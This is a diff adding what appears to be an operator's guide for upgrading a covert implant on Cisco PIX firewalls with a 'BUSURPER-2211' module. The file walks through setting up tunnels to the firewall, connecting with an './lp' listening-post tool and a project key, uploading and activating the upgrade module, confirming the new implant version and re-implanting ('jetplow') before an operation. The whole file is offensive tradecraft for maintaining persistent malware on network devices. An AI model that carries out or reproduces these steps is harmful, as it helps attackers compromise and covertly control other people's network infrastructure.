@@ -1,0 +1,75 @@
+### Upgrading a pix implant from a version of BF/BG to the current BG 
+# version using the BUSURPER-2211.module
+###
+
+### Offline
+# There is no work to do offline to UPGRADE
+# All upgrade modules are located in FW/BANANAUSURPER/BG2200_UPGRADE/UPGRADE
+
+### What you need to do
+1. Copy the BUSURPER-2211.mod to FW/<current_version>/Install/LP/Modules/PIX
+2. Create links or copy the UPGRADE MODULE exe and exe.bin file.
+3. Using the current LP, upload the BUSURPER-2211.mod/UPGRADE_BG2200
+4. Using the current LP, active the BUSURPER-2211.mod/UPGRADE_BG2200 module, id 9999
+
+# Setup tunnels on pitch
+-tunnel
+u 35442 <pix ip> 500 500
+
+# Using the current LP for the firewall
+./lp --lp 127.0.0.1 --implant 127.0.0.1 --idkey <project.key> --timeout 10 --sport 35402 --dport 35442
+
+Choose option 1 to Open a session
+# You'll see a line like this:
+# "OS Version    : 00000633" - this is IOS 6.3.3
+# You'll use the IOS version to select the correct BUSURPER module
+
+Choose option 9 to close the session
+
+# How to add the UPGRADE_BG2200 module
+
+# Copy the BUSURPER-2211.mod module, the BUSURPER-2211-<IOS>.exe.bin, and the BUSURPER-2211.<IOS>.exe to the directory with the 
+# other modules for the version of BF/BG you are running. This is either the 
+# lp/Modules directory for BF or the lp/Modules/PIX directory for BG
+
+# Remove the <IOS> in the exe and exe.bin files so the directory will have
+BUSURPER-2211.mod
+BUSURPER-2211.exe.bin
+BUSURPER-2211.exe 
+
+# Re-connect to the pix with the lp
+./lp --lp 127.0.0.1 --implant 127.0.0.1 --idkey <project.key> --timeout 10 --sport 35402 --dport 35442
+
+Choose option 1 to open a session
+
+Choose option 36 to view uploaded modules.
+
+# If there are any currently loaded modules you should remove them now.
+
+Choose option 30 to List Uploadable Modules.
+
+# Make sure "BUSURPER-2211.mod" or "UPGRADE_BG2200" is listed. 
+# If it isn't listed, you don't have the BUSURPER-2211.mod and the BUSURPER-2211.exe in the
+# correct directory... so close the lp and move those files to the correct directory
+# and then come back and continue with these instructions.
+
+Choose option 31 to Upload the BUSURPER-2211.mod module
+
+Choose option 32 to Activate the BUSURPER-2211.mod module
+
+# At this point communications will time out on the LP. You can verify by choosing
+# Option 10 and tring to read the Interface info. When it times out, it means you
+# have either upgraded successfully, the pix is rebooting, or it's dead.
+
+# Now, lets continue on the assumption you did everything correctly..
+
+# Go to the BG2200 directory
+
+# Connect to the pix with the lp and the same key you used before.
+
+Choose Option 1 to open a session.
+
+# If you see "Implant Version: 2.2.X, you are successful!
+
+# Now you have the opportunity to jetplow the pix with the new version
+# of the implant (Which you should have prepared and tested before your op!)
